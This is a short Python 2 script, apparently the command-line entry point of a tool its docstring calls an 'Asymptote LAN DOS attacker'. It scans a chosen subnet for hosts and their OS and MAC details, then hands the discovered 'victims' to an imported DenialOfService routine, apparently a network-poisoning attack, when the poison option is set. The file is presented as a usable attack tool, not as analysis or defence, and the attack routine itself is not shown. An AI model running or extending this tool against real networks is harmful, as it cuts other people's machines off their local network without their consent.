#!/usr/bin/env python

import click
import hosts
from poison import DenialOfService
import subnet

@click.command()
@click.option('-i','--iface', default='prompt',help='use this network interface')
@click.option('-s','--scan', count=True, help="find online hosts (-ss for OS and MAC identification")
@click.option('-p','--poison', default='poison', help="Quarantine specified IP for IP's within givin range")
@click.option('-v','--verbose', count=True, help="increase verbosity (-vv for greater effect)")
#@click.option('-q','--quarantine', default='quarantine', help="specify target to quarantine (default is router)")
@click.argument('iprange', default='subnet')
def cli(iface, scan, poison, verbose, iprange):
	"""Asymptote LAN DOS attacker"""
	print "iface = %s\nscan = %s\npoison = %s\nverbose = %s\nipRange = %s" % (iface,scan,poison,verbose, iprange)

	if iface == 'prompt':
		subnet.printInterfaces()
		iface = raw_input("Select an interface:\n")

	if iprange == 'subnet':
		iprange = subnet.getSubnet(iface)
 	
	victims = hosts.getTargets(iface, iprange, scan, verbose)
			
	if poison != 'poison':
		DenialOfService(iface, victims, verbose)
	#Scan and poison, scan the range and prompt user for attack range
    	#if scan != 0 and poison:
	#	pass
	 
	#Error Please select a scan or poison option
	#elif scan == 0 and not poison:
	#	pass	
	
	#elif scan != 0: #and !poison:
	#	hosts.getTargets(iface, iprange, scan, verbose, False)
			
	#elif poison: #and scan == 0
	#	victims = getTargets(interface, targetString, 0, verbose, True)
	#	DenialOfService(iface, victims, verbose)

if __name__ == '__main__':
    cli()
